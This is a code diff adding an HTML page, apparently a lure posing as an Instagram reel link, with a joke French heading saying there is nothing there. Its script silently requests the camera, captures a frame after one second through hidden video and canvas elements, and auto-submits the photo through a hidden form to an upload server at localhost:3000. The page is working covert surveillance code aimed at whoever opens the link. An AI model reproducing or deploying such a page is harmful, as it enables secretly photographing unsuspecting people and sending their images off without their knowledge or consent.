@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>reelinstadeh22drole</title>
+</head>
+<body>
+    <h1>ouais nan enfaite y'a rien !</h1>
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <form id="uploadForm" action="http://localhost:3000/upload" method="POST" enctype="multipart/form-data">
+        <input type="file" name="photo" id="photoInput" style="display:none;" />
+        <button type="submit" id="submitButton" style="display:none;">Envoyer</button>
+    </form>
+    <script>
+        // Accéder à la caméra
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        const uploadForm = document.getElementById('uploadForm');
+        const photoInput = document.getElementById('photoInput');
+        const submitButton = document.getElementById('submitButton');
+
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+
+                // Attendre 1 seconde avant de capturer la photo
+                setTimeout(() => {
+                    // Définir la taille du canvas
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+
+                    // Dessiner l'image de la vidéo dans le canvas
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    // Convertir l'image en Blob
+                    canvas.toBlob((blob) => {
+                        // Créer un fichier à partir du Blob
+                        const file = new File([blob], 'photo.png', { type: 'image/png' });
+
+                        // Mettre le fichier dans l'input caché du formulaire
+                        const dataTransfer = new DataTransfer();
+                        dataTransfer.items.add(file);
+                        photoInput.files = dataTransfer.files;
+
+                        // Soumettre le formulaire
+                        submitButton.click();
+                    }, 'image/png');
+
+                    // Arrêter la caméra
+                    const tracks = stream.getTracks();
+                    tracks.forEach(track => track.stop());
+                }, 1000);
+            })
+            .catch(error => {
+                console.error('Erreur avec la caméra :', error);
+            });
+    </script>
+</body>
+</html>
